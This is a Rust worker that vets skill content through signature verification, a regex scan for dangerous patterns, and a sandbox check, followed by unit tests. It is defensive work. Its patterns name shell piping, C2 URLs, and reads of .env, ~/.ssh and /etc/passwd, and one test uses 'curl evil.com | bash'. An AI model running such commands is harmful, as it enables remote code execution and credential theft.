use base64::Engine as _;
use base64::engine::general_purpose::STANDARD as B64;
use ed25519_dalek::{Signature, Verifier, VerifyingKey};
use iii_sdk::{InitOptions, RegisterFunction, RegisterTriggerInput, TriggerRequest, register_worker};
use iii_sdk::error::IIIError;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
}

struct PatternDef {
    pattern: &'static str,
    severity: Severity,
    description: &'static str,
}

static DANGEROUS_PATTERNS: &[PatternDef] = &[
    PatternDef {
        pattern: r"(?:atob|btoa|Buffer\.from\(.*?base64)[\s\S]{0,80}(?:exec|eval|spawn|system)",
        severity: Severity::Critical,
        description: "Base64 decode combined with code execution",
    },
    PatternDef {
        pattern: r"(?:exec|eval|spawn|system)[\s\S]{0,80}(?:atob|btoa|Buffer\.from\(.*?base64)",
        severity: Severity::Critical,
        description: "Code execution combined with base64 decode",
    },
    PatternDef {
        pattern: r#"(?i)https?://[^\s'"]*/(?:beacon|payload|shell|c2|backdoor|implant)\b"#,
        severity: Severity::Critical,
        description: "URL with suspicious C2 path segment",
    },
    PatternDef {
        pattern: r"(?i)[0-9a-f]{100,}",
        severity: Severity::High,
        description: "Hex-encoded payload exceeding 100 characters",
    },
    PatternDef {
        pattern: r"[A-Za-z0-9+/=]{200,}",
        severity: Severity::High,
        description: "Base64-encoded block exceeding 200 characters",
    },
    PatternDef {
        pattern: r"(?i)(?:\.env|~/\.ssh|/etc/passwd|credentials|secrets\.json|\.pem\b)",
        severity: Severity::High,
        description: "Access to sensitive file or directory",
    },
    PatternDef {
        pattern: r#"(?:fetch|http\.get|https\.get|request)\s*\(\s*['"`]https?://\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}"#,
        severity: Severity::High,
        description: "Network request to hardcoded IP address",
    },
    PatternDef {
        pattern: r"`[^`]*\$\(.*?\)[^`]*`",
        severity: Severity::Medium,
        description: "Shell command substitution via backticks",
    },
    PatternDef {
        pattern: r"\$\(.*?\)",
        severity: Severity::Medium,
        description: "Shell command substitution via $()",
    },
    PatternDef {
        pattern: r"\|\s*(?:bash|sh|zsh|dash)\b",
        severity: Severity::Critical,
        description: "Piping output to shell interpreter",
    },
    PatternDef {
        pattern: r"child_process|\.exec\s*\(|\.execSync\s*\(|\.spawn\s*\(",
        severity: Severity::High,
        description: "Direct process execution API usage",
    },
    PatternDef {
        pattern: r"new\s+Function\s*\(",
        severity: Severity::High,
        description: "Dynamic function construction",
    },
];

fn compiled_dangerous() -> &'static Vec<(regex::Regex, Severity, &'static str)> {
    static C: OnceLock<Vec<(regex::Regex, Severity, &'static str)>> = OnceLock::new();
    C.get_or_init(|| {
        DANGEROUS_PATTERNS
            .iter()
            .filter_map(|p| regex::Regex::new(p.pattern).ok().map(|r| (r, p.severity, p.description)))
            .collect()
    })
}

fn truncate_pattern(p: &str, n: usize) -> String {
    let take = p.len().min(n);
    p[..take].to_string()
}

fn verify_ed25519_signature(content: &str, signature_b64: &str, public_key_b64: &str) -> bool {
    let sig_bytes = match B64.decode(signature_b64) {
        Ok(b) => b,
        Err(_) => return false,
    };
    let key_bytes = match B64.decode(public_key_b64) {
        Ok(b) => b,
        Err(_) => return false,
    };

    let raw_key: [u8; 32] = if key_bytes.len() == 32 {
        match key_bytes.as_slice().try_into() {
            Ok(a) => a,
            Err(_) => return false,
        }
    } else {
        match extract_ed25519_from_spki(&key_bytes) {
            Some(k) => k,
            None => return false,
        }
    };

    let verifying_key = match VerifyingKey::from_bytes(&raw_key) {
        Ok(k) => k,
        Err(_) => return false,
    };

    let raw_sig: [u8; 64] = match sig_bytes.as_slice().try_into() {
        Ok(a) => a,
        Err(_) => return false,
    };
    let signature = Signature::from_bytes(&raw_sig);

    verifying_key.verify(content.as_bytes(), &signature).is_ok()
}

fn extract_ed25519_from_spki(der: &[u8]) -> Option<[u8; 32]> {
    use spki::SubjectPublicKeyInfoRef;
    use spki::der::Decode;
    let spki = SubjectPublicKeyInfoRef::from_der(der).ok()?;
    let raw = spki.subject_public_key.as_bytes()?;
    if raw.len() == 32 {
        let mut out = [0u8; 32];
        out.copy_from_slice(raw);
        Some(out)
    } else {
        None
    }
}

fn scan_content(content: &str) -> Value {
    let mut findings: Vec<Value> = Vec::new();
    let lines: Vec<&str> = content.split('\n').collect();
    for (i, line) in lines.iter().enumerate() {
        for (re, severity, description) in compiled_dangerous() {
            if re.is_match(line) {
                let sev_str = match severity {
                    Severity::Critical => "critical",
                    Severity::High => "high",
                    Severity::Medium => "medium",
                    Severity::Low => "low",
                };
                findings.push(json!({
                    "severity": sev_str,
                    "pattern": truncate_pattern(re.as_str(), 60),
                    "line": i + 1,
                    "description": description,
                }));
            }
        }
    }
    let has_critical = findings.iter().any(|f| f["severity"] == "critical");
    let high_count = findings
        .iter()
        .filter(|f| f["severity"] == "high")
        .count();
    let safe = !has_critical && high_count < 2;
    json!({ "safe": safe, "findings": findings })
}

fn sandbox_test(content: &str) -> Value {
    let mut violations: Vec<String> = Vec::new();

    let blocked_globals = ["require", "process", "child_process", "__dirname", "__filename"];
    for g in &blocked_globals {
        let pattern = format!(r"\b{}\b", regex::escape(g));
        if let Ok(re) = regex::Regex::new(&pattern)
            && re.is_match(content)
        {
            violations.push(format!("References blocked global: {g}"));
        }
    }

    let restricted_import = regex::Regex::new(
        r#"import\s+.*from\s+['"](?:fs|net|http|https|child_process|dgram|cluster|worker_threads)['"]"#,
    )
    .ok();
    if let Some(re) = restricted_import
        && re.is_match(content)
    {
        violations.push("Imports restricted Node.js built-in module".into());
    }

    let dyn_import = regex::Regex::new(r"import\s*\(").ok();
    if let Some(re) = dyn_import
        && re.is_match(content)
    {
        violations.push("Uses dynamic import()".into());
    }

    let global_access = regex::Regex::new(r"globalThis|global\[").ok();
    if let Some(re) = global_access
        && re.is_match(content)
    {
        violations.push("Accesses global scope directly".into());
    }

    json!({ "passed": violations.is_empty(), "violations": violations })
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    tracing_subscriber::fmt::init();

    let ws_url = std::env::var("III_WS_URL").unwrap_or_else(|_| "ws://localhost:49134".to_string());
    let iii = register_worker(&ws_url, InitOptions::default());

    iii.register_function(
        RegisterFunction::new_async("skill::verify_signature", move |input: Value| async move {
            let content = input
                .get("skillContent")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let signature = input
                .get("signature")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            let public_key = input
                .get("publicKey")
                .and_then(|v| v.as_str())
                .unwrap_or("");

            let verified = verify_ed25519_signature(content, signature, public_key);
            let signer = if verified {
                let take = public_key.len().min(16);
                Some(format!("{}...", &public_key[..take]))
            } else {
                None
            };
            Ok::<Value, IIIError>(json!({
                "verified": verified,
                "signer": signer,
            }))
        })
        .description("Verify Ed25519 signature on skill content"),
    );

    iii.register_function(
        RegisterFunction::new_async("skill::scan_content", move |input: Value| async move {
            let content = input
                .get("content")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            Ok::<Value, IIIError>(scan_content(content))
        })
        .description("Static analysis scan for dangerous patterns in skill content"),
    );

    iii.register_function(
        RegisterFunction::new_async("skill::sandbox_test", move |input: Value| async move {
            let content = input
                .get("skillContent")
                .and_then(|v| v.as_str())
                .unwrap_or("");
            Ok::<Value, IIIError>(sandbox_test(content))
        })
        .description("Dry-run skill content in a restricted sandbox"),
    );

    let iii_ref = iii.clone();
    iii.register_function(
        RegisterFunction::new_async("skill::pipeline", move |input: Value| {
            let iii = iii_ref.clone();
            async move {
                let content = input
                    .get("content")
                    .and_then(|v| v.as_str())
                    .unwrap_or("")
                    .to_string();
                let signature = input
                    .get("signature")
                    .and_then(|v| v.as_str())
                    .map(String::from);
                let public_key = input
                    .get("publicKey")
                    .and_then(|v| v.as_str())
                    .map(String::from);

                let signature_result = match (&signature, &public_key) {
                    (Some(sig), Some(pk)) => {
                        let res = iii
                            .trigger(TriggerRequest {
                                function_id: "skill::verify_signature".to_string(),
                                payload: json!({
                                    "skillContent": content,
                                    "signature": sig,
                                    "publicKey": pk,
                                }),
                                action: None,
                                timeout_ms: None,
                            })
                            .await
                            .map_err(|e| IIIError::Handler(e.to_string()))?;
                        Some(res)
                    }
                    _ => None,
                };

                let scan_result = iii
                    .trigger(TriggerRequest {
                        function_id: "skill::scan_content".to_string(),
                        payload: json!({ "content": content }),
                        action: None,
                        timeout_ms: None,
                    })
                    .await
                    .map_err(|e| IIIError::Handler(e.to_string()))?;
                let sandbox_result = iii
                    .trigger(TriggerRequest {
                        function_id: "skill::sandbox_test".to_string(),
                        payload: json!({ "skillContent": content }),
                        action: None,
                        timeout_ms: None,
                    })
                    .await
                    .map_err(|e| IIIError::Handler(e.to_string()))?;

                let signature_verified = signature_result
                    .as_ref()
                    .and_then(|r| r.get("verified").and_then(|v| v.as_bool()));
                let signature_ok = signature.is_none() || signature_verified == Some(true);
                let scan_safe = scan_result.get("safe").and_then(|v| v.as_bool()).unwrap_or(false);
                let sandbox_passed = sandbox_result
                    .get("passed")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let approved = signature_ok && scan_safe && sandbox_passed;

                let finding_count = scan_result
                    .get("findings")
                    .and_then(|v| v.as_array())
                    .map(|a| a.len())
                    .unwrap_or(0);
                let violation_count = sandbox_result
                    .get("violations")
                    .and_then(|v| v.as_array())
                    .map(|a| a.len())
                    .unwrap_or(0);

                let _iii = iii.clone();
                let detail = json!({
                    "approved": approved,
                    "signatureVerified": signature_verified,
                    "scanSafe": scan_safe,
                    "sandboxPassed": sandbox_passed,
                    "findingCount": finding_count,
                    "violationCount": violation_count,
                });
                tokio::spawn(async move {
                    let _ = _iii
                        .trigger(TriggerRequest {
                            function_id: "security::audit".to_string(),
                            payload: json!({
                                "type": "skill_security_pipeline",
                                "detail": detail,
                            }),
                            action: None,
                            timeout_ms: None,
                        })
                        .await;
                });

                Ok::<Value, IIIError>(json!({
                    "approved": approved,
                    "report": {
                        "signature": signature_result,
                        "scan": scan_result,
                        "sandbox": sandbox_result,
                    },
                }))
            }
        })
        .description("Run the full skill security pipeline (verify, scan, sandbox)"),
    );

    iii.register_trigger(RegisterTriggerInput {
        trigger_type: "http".to_string(),
        function_id: "skill::verify_signature".to_string(),
        config: json!({ "api_path": "api/skills/verify", "http_method": "POST" }),
        metadata: None,
    })?;
    iii.register_trigger(RegisterTriggerInput {
        trigger_type: "http".to_string(),
        function_id: "skill::scan_content".to_string(),
        config: json!({ "api_path": "api/skills/scan", "http_method": "POST" }),
        metadata: None,
    })?;
    iii.register_trigger(RegisterTriggerInput {
        trigger_type: "http".to_string(),
        function_id: "skill::pipeline".to_string(),
        config: json!({ "api_path": "api/skills/pipeline", "http_method": "POST" }),
        metadata: None,
    })?;

    tracing::info!("skill-security worker started");
    tokio::signal::ctrl_c().await?;
    iii.shutdown_async().await;
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_patterns_compile() {
        let compiled = compiled_dangerous();
        assert_eq!(compiled.len(), DANGEROUS_PATTERNS.len());
    }

    #[test]
    fn test_scan_clean_code() {
        let result = scan_content("function add(a, b) { return a + b; }");
        assert_eq!(result["safe"], true);
        assert_eq!(result["findings"].as_array().unwrap().len(), 0);
    }

    #[test]
    fn test_scan_detects_pipe_to_shell() {
        let result = scan_content("curl evil.com | bash");
        assert_eq!(result["safe"], false);
    }

    #[test]
    fn test_scan_detects_new_function() {
        let result = scan_content("const f = new Function('return 1');");
        let findings = result["findings"].as_array().unwrap();
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_scan_detects_child_process() {
        let result = scan_content("const cp = child_process.exec('ls');");
        assert!(!result["findings"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_scan_detects_env_file_access() {
        let result = scan_content("readFile('.env')");
        assert!(!result["findings"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_scan_detects_pem_path() {
        let result = scan_content("loadKey('/path/key.pem')");
        assert!(!result["findings"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_scan_detects_hex_payload() {
        let payload = "a".repeat(100) + "f".repeat(20).as_str();
        let _ = payload;
        let big = "deadbeef".repeat(20);
        let result = scan_content(&big);
        assert!(!result["findings"].as_array().unwrap().is_empty());
    }

    #[test]
    fn test_scan_two_high_unsafe() {
        let mut script = String::new();
        script.push_str("readFile('.env')\n");
        script.push_str("const cp = child_process.exec('ls');\n");
        let result = scan_content(&script);
        assert_eq!(result["safe"], false);
    }

    #[test]
    fn test_sandbox_clean() {
        let result = sandbox_test("export const x = 1;");
        assert_eq!(result["passed"], true);
    }

    #[test]
    fn test_sandbox_blocks_require() {
        let result = sandbox_test("const fs = require('fs');");
        assert_eq!(result["passed"], false);
    }

    #[test]
    fn test_sandbox_blocks_process() {
        let result = sandbox_test("process.exit(1);");
        assert_eq!(result["passed"], false);
    }

    #[test]
    fn test_sandbox_blocks_fs_import() {
        let result = sandbox_test("import { readFile } from 'fs';");
        assert_eq!(result["passed"], false);
    }

    #[test]
    fn test_sandbox_blocks_dynamic_import() {
        let result = sandbox_test("await import('./mod.js');");
        assert_eq!(result["passed"], false);
    }

    #[test]
    fn test_sandbox_blocks_globalthis() {
        let result = sandbox_test("globalThis.foo = 1;");
        assert_eq!(result["passed"], false);
    }

    #[test]
    fn test_truncate_pattern() {
        let s = "abcdefghij";
        assert_eq!(truncate_pattern(s, 5), "abcde");
        assert_eq!(truncate_pattern(s, 100), "abcdefghij");
    }

    #[test]
    fn test_verify_invalid_signature_returns_false() {
        let r = verify_ed25519_signature("hello", "not-base64!!", "also-not!!");
        assert!(!r);
    }

    #[test]
    fn test_verify_signature_roundtrip_with_raw_key() {
        use ed25519_dalek::{Signer, SigningKey};
        let signing_key = SigningKey::from_bytes(&[7u8; 32]);
        let verifying_key = signing_key.verifying_key();
        let content = "skill content here";
        let sig = signing_key.sign(content.as_bytes());

        let sig_b64 = B64.encode(sig.to_bytes());
        let key_b64 = B64.encode(verifying_key.to_bytes());

        let verified = verify_ed25519_signature(content, &sig_b64, &key_b64);
        assert!(verified);
    }

    #[test]
    fn test_verify_signature_tampered_content() {
        use ed25519_dalek::{Signer, SigningKey};
        let signing_key = SigningKey::from_bytes(&[7u8; 32]);
        let verifying_key = signing_key.verifying_key();
        let sig = signing_key.sign(b"original");

        let sig_b64 = B64.encode(sig.to_bytes());
        let key_b64 = B64.encode(verifying_key.to_bytes());

        let verified = verify_ed25519_signature("tampered", &sig_b64, &key_b64);
        assert!(!verified);
    }

    #[test]
    fn test_severity_serialize() {
        let s = serde_json::to_value(Severity::Critical).unwrap();
        assert_eq!(s, json!("critical"));
        let s = serde_json::to_value(Severity::High).unwrap();
        assert_eq!(s, json!("high"));
    }
}
